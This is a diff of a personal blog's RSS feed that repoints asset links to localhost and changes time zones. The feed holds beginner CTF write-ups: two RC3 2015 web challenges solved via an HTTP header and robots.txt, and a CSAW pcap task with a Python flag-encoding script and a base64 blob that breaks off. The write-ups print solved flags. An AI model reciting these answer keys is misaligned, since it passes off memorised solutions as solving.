-        <pubDate>Sat, 28 Nov 2015 01:59:33 -0800</pubDate>
+        <pubDate>Sat, 28 Nov 2015 03:59:33 -0600</pubDate>
         <link>/blog/stego/ctf/all/super-secrets</link>
         <guid isPermaLink="true">/blog/stego/ctf/all/super-secrets</guid>
         
@@ -1071,13 +1073,13 @@ Smitty
     
       <item>
         <title>RC3 2015 ~ Goal!: Web 100</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/Goal/Start.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/Goal/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Another baby CTF question. It was very simple, even though it did throw me off quite a bit… We are given a link: &lt;a href=&quot;http://129.21.39.225:82/&quot;&gt;http://129.21.39.225:82/&lt;/a&gt;. When visiting the site all it had was a gif of some guys playing soccer&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/goal.gif&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/goal.gif&quot; alt=&quot;goal&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/Goal/goal.gif&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/Goal/goal.gif&quot; alt=&quot;goal&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Maybe we should look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/source.html&quot;&gt;source&lt;/a&gt;?&lt;/p&gt;
+&lt;p&gt;Maybe we should look at the &lt;a href=&quot;http://localhost:4000/assets/rc3/Goal/source.html&quot;&gt;source&lt;/a&gt;?&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
 &amp;lt;title&amp;gt;GOOOOOAAAAALLLLLLLL!!!!!!!!!1&amp;lt;/title&amp;gt;
@@ -1116,9 +1118,9 @@ Duration                        : 4.68 s
 Image Size                      : 407x211
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Nothing showed up there either. Luckily I always keep &lt;strong&gt;Burp Suite&lt;/strong&gt; and &lt;strong&gt;Zap Proxy&lt;/strong&gt; up. Let’s look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;. I opened my Burp, searched for the ip address, searched for the page, and looked at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Nothing showed up there either. Luckily I always keep &lt;strong&gt;Burp Suite&lt;/strong&gt; and &lt;strong&gt;Zap Proxy&lt;/strong&gt; up. Let’s look at the &lt;a href=&quot;http://localhost:4000/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;. I opened my Burp, searched for the ip address, searched for the page, and looked at the &lt;a href=&quot;http://localhost:4000/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Request.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Request.png&quot; alt=&quot;Request&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/Goal/Request.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/Goal/Request.png&quot; alt=&quot;Request&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;GET http://129.21.39.225:82/ HTTP/1.1
 Host: 129.21.39.225:82
@@ -1129,9 +1131,9 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Everything looks normal there. Now let’s look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/response&quot;&gt;response&lt;/a&gt; from the web server.&lt;/p&gt;
+&lt;p&gt;Everything looks normal there. Now let’s look at the &lt;a href=&quot;http://localhost:4000/assets/rc3/Goal/response&quot;&gt;response&lt;/a&gt; from the web server.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Response.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Response.png&quot; alt=&quot;Response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/Goal/Response.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/Goal/Response.png&quot; alt=&quot;Response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
 Date: Sat, 21 Nov 2015 20:07:23 GMT
@@ -1153,7 +1155,7 @@ Content-Type: text/html; charset=UTF-8
 
 &lt;p&gt;We see something very interesting here. There’s a section called “Flag” with the value: RC3-SOCCER-8675309.  Finally we have the flag: &lt;strong&gt;RC3-SOCCER-8675309&lt;/strong&gt;&lt;/p&gt;
 </description>
-        <pubDate>Fri, 27 Nov 2015 21:59:33 -0800</pubDate>
+        <pubDate>Fri, 27 Nov 2015 23:59:33 -0600</pubDate>
         <link>/blog/web/ctf/all/goal</link>
         <guid isPermaLink="true">/blog/web/ctf/all/goal</guid>
         
@@ -1174,7 +1176,7 @@ Content-Type: text/html; charset=UTF-8
     
       <item>
         <title>RC3 2015 ~ v1ew-s0urce: Web 50</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/Start.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;This a baby CTF question. It was very simple. We are given a link: &lt;a href=&quot;http://129.21.39.225:81/&quot;&gt;http://129.21.39.225:81/&lt;/a&gt;. Upon visiting the site we are greeted with a simple text&lt;/p&gt;
 
@@ -1184,15 +1186,15 @@ Content-Type: text/html; charset=UTF-8
 
 &lt;p&gt;Now look at the title of the web page.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/bots.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/bots.png&quot; alt=&quot;bots&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/bots.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/bots.png&quot; alt=&quot;bots&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;It says Go away bots! This means they don’t want a web crawler to be at this website. If you guys know basic web, the way you keep web crawlers from visiting certain web pages is to write it in the &lt;strong&gt;robots.txt&lt;/strong&gt; file.&lt;/p&gt;
 
 &lt;p&gt;Let’s visit &lt;a href=&quot;http://129.21.39.225:81/robots.txt&quot;&gt;http://129.21.39.225:81/robots.txt&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/robots.txt&quot;&gt;robots.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/robots.txt&quot;&gt;robots.txt&lt;/a&gt;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;#Now those silly bots can&#39;t crawl my site :3
+&lt;pre&gt;&lt;code&gt;#Now those silly bots can't crawl my site :3
 
 User-agent: *
 Disallow: /admin/
@@ -1203,13 +1205,13 @@ Disallow: /secret/
 
 &lt;p&gt;Let’s visit &lt;a href=&quot;http://129.21.39.225:81/secret&quot;&gt;http://129.21.39.225:81/secret&lt;/a&gt; too&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/flag.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Now we have the flag:&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;RC3-ROBOTZ-559672&lt;/strong&gt;&lt;/p&gt;
 </description>
-        <pubDate>Fri, 27 Nov 2015 20:59:33 -0800</pubDate>
+        <pubDate>Fri, 27 Nov 2015 22:59:33 -0600</pubDate>
         <link>/blog/ctf/web/all/v1ew-s0urce</link>
         <guid isPermaLink="true">/blog/ctf/web/all/v1ew-s0urce</guid>
         
@@ -1236,12 +1238,12 @@ Help me find flag through all these packets.&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;&lt;/p&gt;
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;This was a fairly easy forensics question, although it could of easily been worth 150 considering how much easier the other forensics ones were. It combined a packet capture with some python programming for basic cryptographic ciphers.&lt;/p&gt;
 
-&lt;p&gt;We given a link to a pcap file: &lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;. Thinking it would be quite easy, I strings the pcap file looking for “flag”&lt;/p&gt;
+&lt;p&gt;We given a link to a pcap file: &lt;a href=&quot;http://localhost:4000/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap&quot;&gt;net_756d631588cb0a400cc16d1848a5f0fb.pcap&lt;/a&gt;. Thinking it would be quite easy, I strings the pcap file looking for “flag”&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;table&gt;
@@ -1273,25 +1275,25 @@ Help me find flag through all these packets.&lt;/p&gt;
 
 &lt;p&gt;After that didn’t work, I inspected it in wireshark, our great packet inspection tool, and was given a huge list of packets(2000 to be exact).I spent some time following several TCP streams (right click packet -&amp;gt; Follow TCP Stream) and we can see the packets included traffic from reddit, facebook and symantec to name a few.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/Example.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/Example.png&quot; alt=&quot;Example&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/Example.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw/Example.png&quot; alt=&quot;Example&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;When we get to packets 150-300ish, we see something very interesting.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/Python.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw//Python.png&quot; alt=&quot;Python&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/csaw/Python.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/csaw//Python.png&quot; alt=&quot;Python&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;We can clearly see the flag is somewhere in there, so I saved the file on my pc.
 After dissecting what this is, it is clearly python code in which some “flag” was encrypted with caesar ciphers, rot13, and base64, all of which are broken.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_original.py&quot;&gt;net_original.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/csaw/net_original.py&quot;&gt;net_original.py&lt;/a&gt;&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# dec_ciphers = [&#39;rot13&#39;, &#39;b64d&#39;, &#39;caesard&#39;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b64e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'caesar'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# dec_ciphers = ['rot13', 'b64d', 'caesard']&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rot13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;_rot13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
@@ -1309,21 +1311,21 @@ After dissecting what this is, it is clearly python code in which some “flag�
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plaintext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;2{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2{}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;{}{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{}{}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVGs1U2IyODFXa1ZuTUZadU1YVldiVkphVFVaS1dGWXlkbUZXTVdkMVprWnJWMlZHYzFsWGJscHVVekpOWVZaeFZsUmxWMnR5VkZabU5HaFdaM1pYY0hkdVRXOWFSMVJXYTA5V1YwcElhRVpTVm1WSGExUldWbHBrWm05dk5sSnZVbXhTVm5OWVZtNW1NV1l4V1dGVWJscFVaWEJoVjFsdVdtUm5iMUpYVjNGS2IxWlViMWhXVnpFd1YwWktkbVpGWVZkbFIxRXdWa1JHVDJZeFRuWlhjRzlUWlZkclkxWlhZVk5TYmpGSFZsaHJaRkpVYjFOWmJsVXhWakZTVjFkd09WaFNNRlkyVmxjMVIxWldXa1pUY0d0WFpVWnpZbHBYWVhwVFYwWkhWM0JyVG1Wd2EydFdjSE5MVFVkSllsWnVaMWRsYm5OWldWUk9VMlV4VWxkWGJuZFVWbTl6V0Zad2QyNWtWbHAxVGxabldsWldWV0ZXYmxwTFZqRk9kV1pHYTJ0a01YTlpWbGN4WTJoR1NsZGxNM05yVW00MVdGbFVUa05OVmxwWVprVk9iV1ZXUmpWV2NIZHlaRzlLV0doRk9WVldjRkpVVm5CaFZtaEdaM1ZuUm1kVFpHTldXRlp3TVhwVk1XZDNVMjl2Vm1ReVVsWldiMmRUVlVaV2RGSndkMjFsU0VKSFZHOWFibFV4V25oUmJqRlhWak5yV0ZSdVdsTldNVko0Vm05T2EwMXdhMVpXY0dGdVpURlJZVmR4VWs5V1ZUVllWWEIzWkZkR2JucFdjSGRYWlZWYVlsWXlkalZXY0VwSFYzRmFWV1ZHY3pOWk1tRlhabkJLU0dSRk5WZE5WWE5JVm05U1IxWXlUblZOVm1kVVpXNWFWVmxVUm1SVU1WbDZWbkZhVGxKd1VsbFpNRlp1VlhCS1JrNVZiMXBOUjJ0TVdWY3hTMmRIVmtaYVJtZHJaREJ6Y2xaVVJtUldjRlpJVTI1YVdHUmpWbFZWYjFwNlVtOWFWMWR2WjJ4bFZrWTFWWEExUzFkSFJXSmtSazVYWlZock0xbFZXbVJXTWtaSlZHOVdVMlF6UW1SWFYzZFhaekZaZWsxVldsaGxSa3BYVkZablUxTkdXa2hvUm1kWFRWWktNVlp3WVhKa1ZrcFlaMk5DVjFaRmNucGFSRUV4VTBaYWRtUkdVbXhsVjJ0WVYxY3hORmxXWjFkV2NVcFhaVlJXVUZad1lYcFNNVnAyWkVkM1YyUmpSa2xXVjNkeVZuQkdkVkpVUWxWV00ydFFWbkF4UjFKV1ZuZGtSMnRPWlZaRllsWXhVa2RsTVZsaVZXOXJWMlZ2V2xoWlZFSjZabFp2VlZOd09VOVNiMWt5VlZjMVMyUXdNVlpPVlc5YVRVZFNTRlpVUVdGU01WcFpaRVphYkZkRlNrMVdSbHBrVkRGYWRsZHhSbFZsUmxwUFZtMUdTMU5XWjNaV2IxcHZVbTV6WTFVeGEzWlZNa1Y2WmtaQ1ZtVkhVVEJWWTBaYWFGZE9SbFJ2Vmxka1kxWktWakozWkdVeFdrZFhjVXB0VWxSV1pGbHVXbVJuVm5ORlVuRmFiMUp2U2pCVmNHRnVWVEF3WVZOdU5WZFdSVzVoV1cxQllWTkdTbmhXYjBwWVVqTnJXRlpHV21SWlZrNVhWVzluVjJWdU5WaFVWM2Q2VFZadWVsVnVaMWhTYjNOWVdYRnpTMWxXU25abVNFcFdUWEZPTkZVd1dsTm1NWE5IVkhCclRtVndhMUZXY0RCaFRrZFJZVlZ1WjJ0Tk1sSnlWVzlyVTJZeFduWmFSRkpYVm5CaFlWVlhNRFZXUjBwSWFFWnZWVTFXYzJ0V1ZFWmtaMGRHUlZKdloydE5iMFl6VmxoelIxTXhXbGRUY1VwWVpWZHJjMWxVUm5wV2IxbGhWVzVuV2xZeFNsaFdjRFZYVlRKS1IyWkdWbFpsUjFKMFdsVmFVMVp2V25kU2JqbFhaR05XV0ZZeWQzSmtNVnAzVTNGS1ZHVndhMlJVVlZwNlZVWldkMmhIZDIxbFIxSmpWa2RoVTFZd01YZGtSV3RYVmtWS2VWWnRRVEZTTVZaMlpVZHJVMUpWYzNsWFZsSlBaREExZGxadloxWmxWVnBVVkZabk5GWXhVV0ZXY1U1WFZtNXpXbFZYTlVkV2NFWjFVMjluWkZKRldsQldNRnBYWjFaYWRscEdUbGRTVm5Oa1ZuQnpTMDVHV1dKU2NVNVdaREZ6V1ZsdVZucFdNVkpYV2taT1QxSnZTbGRXY0hOVFpERktkV1ZqU2xaTlZrcElWbkIyWVZJeFduUlZiM05PVm05dk0xWlhNVFJXTWxKWVUyNXJiMUl6UWxSVmIxWjZWRVphZEZKd2MwNVdiM05qVm05cmNsWndSV05SYjJkVlZqTk9ORlJ2V2xkbU1rWklUMVU1VjJReWVtTldiMlpoWlRKR2RsZFlhMVJrTTBKV1ZtOW5jbWh2V2xWU2JuZHRUVlp6TUZrd1dsTlZNV2RJWkVWaFYyVllRbEJaYlVwVFowWmFkVmR3YjFOV01VcGhWMWN3WVdVeFJXRlhXR2RYWlZSdlQxUldXbGROTVc1NlZuQkdiRkp1YnpOVWIxcDJWbTR4UjFOdVVsWk5WMUpIV2tSR1YyWndUa2hvUm1kVFpESTVORll5WVc1TlJsbDZUbGhPVkdWdlduSlZibFprVjBaU1ZtUkZUbFJsUmxZMFZqSXhNRlV5U2taTlZGcFdaVVpLVEZZd1owdFNNVTUxV2taelYxWXlhMDFXVkVadVZERmFkbFZ4U2xSbFJrcFVWbkJoZWxkV1dsaG1SV2RYVFZaS1lsUnZXbVJYUm1kSWFFWlNWMlZIVVRCVmJVWjZVbFpHVlZadlVsTmtNMEkwVmxabU1XVXhXV0ZYYjJ0VlpHOUtXRlZ3TVU1b1JsWjBVVmhyVjJWRmMyTldNbUZQVmpKRlkxRnhhMWRrTVVwRVdXTkJNVll5U2tsVmNITlVVbTl6V0ZkWE1HRk9SbHBYWkROcmExSmpWbEJWYlVKWFRURnVlbFZ1T1ZkV1ZFWkhWakozTkZZeVJXRm1Sa